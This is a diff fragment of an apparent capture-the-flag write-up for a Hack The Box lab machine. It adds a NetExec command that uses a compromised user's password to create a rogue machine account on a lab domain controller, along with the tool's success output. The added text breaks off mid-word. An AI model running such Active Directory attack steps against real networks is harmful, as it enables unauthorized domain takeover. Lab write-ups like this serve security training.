@@ -693,8 +693,13 @@ MAQ         10.129.66.164   389    DC               MachineAccountQuota: 10
 Checking the machine account quota, i see its set to 10, so that makes this even easier
 
 ```python
-
+nxc smb dc.freelancer.htb -u lorra199 -p 'PWN3D#l0rr@Armessa199' -M add-computer -o NAME=EVIL PASSWORD=Password123!
+SMB         10.129.66.164   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.66.164   445    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 
+ADD-COMP... 10.129.66.164   445    DC               Successfully added the machine account: 'EVIL$' with Password: 'Password123!'
 ```
+
+First ill use nxc to add a computer accou
 
 
 
